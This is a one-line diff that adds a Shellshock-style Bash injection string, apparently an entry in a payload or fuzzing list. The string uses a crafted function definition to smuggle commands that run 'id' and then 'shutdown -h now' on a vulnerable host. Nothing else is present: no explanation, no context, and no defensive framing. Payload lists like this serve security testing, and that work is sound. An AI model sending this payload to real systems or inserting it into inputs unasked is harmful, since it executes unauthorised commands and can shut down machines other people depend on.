@@ -1,0 +1,1 @@
+() { 42;};echo;/usr/bin/id&&/usr/bin /sbin/shutdown -h now;
